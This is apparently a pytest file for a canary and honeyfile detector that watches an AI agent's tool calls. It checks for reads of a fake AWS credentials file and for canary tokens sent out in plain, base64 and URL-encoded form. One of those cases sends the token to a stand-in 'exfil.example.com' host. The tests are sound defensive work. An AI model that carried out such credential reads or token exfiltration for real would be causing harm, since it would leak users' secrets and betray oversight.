from __future__ import annotations

import pytest
from pathlib import Path
from agent_blackbox.security.canaries import CanaryManager


def test_canary_deployment_and_tripwire(tmp_path):
    mgr = CanaryManager()
    created = mgr.deploy_honeyfiles(tmp_path)
    assert len(created) >= 3

    # Agent calls tool referencing honeyfile
    alerts = mgr.check_arguments_and_payload(
        tool_name="read_file",
        arguments={"path": str(tmp_path / "aws_credentials.honey.json")},
    )
    assert len(alerts) > 0
    assert alerts[0].alert_type == "canary_file"
    assert alerts[0].severity == "CRITICAL"


def test_canary_token_detection():
    mgr = CanaryManager(tokens=["CANARY_SECRET_TOKEN_9999"])
    alerts = mgr.check_arguments_and_payload(
        tool_name="http_request",
        arguments={"url": "https://api.example.com", "header": "Bearer CANARY_SECRET_TOKEN_9999"},
    )
    assert len(alerts) == 1
    assert alerts[0].alert_type == "canary_token"
    assert alerts[0].severity == "CRITICAL"


def test_canary_token_base64_encoded_detection():
    import base64
    raw_token = "CANARY_TOKEN_ABC123XYZ"
    mgr = CanaryManager(tokens=[raw_token])

    b64_token = base64.b64encode(raw_token.encode("utf-8")).decode("utf-8")
    payload = {"payload": b64_token, "note": "encoded data transfer"}

    alerts = mgr.check_arguments_and_payload("http_request", payload)
    assert len(alerts) >= 1
    assert alerts[0].severity == "CRITICAL"
    assert "Canary secret token" in alerts[0].description


def test_canary_token_url_encoded_detection():
    import urllib.parse
    raw_token = "CANARY/TOKEN+SPECIAL=123"
    mgr = CanaryManager(tokens=[raw_token])

    url_encoded = urllib.parse.quote(raw_token)
    payload = {"url": f"https://exfil.example.com/api?leak={url_encoded}"}

    alerts = mgr.check_arguments_and_payload("http_request", payload)
    assert len(alerts) >= 1
    assert alerts[0].severity == "CRITICAL"


def test_canary_false_positive_resistance():
    import base64
    mgr = CanaryManager(tokens=["AKIA_CANARY_SECRET_TOPSECRET"])

    # 1. Benign base64 string
    benign_b64 = base64.b64encode(b"normal diagnostic telemetry metrics and logs").decode("utf-8")
    alerts1 = mgr.check_arguments_and_payload("http_request", {"data": benign_b64})
    assert len(alerts1) == 0

    # 2. Benign URL encoding
    alerts2 = mgr.check_arguments_and_payload("http_request", {
        "url": "https://service.internal/search?query=hello%20world&filter=active%2Bready"
    })
    assert len(alerts2) == 0

    # 3. Random innocent tokens
    alerts3 = mgr.check_arguments_and_payload("run_command", {
        "cmd": "git status && pnpm build --verbose"
    })
    assert len(alerts3) == 0

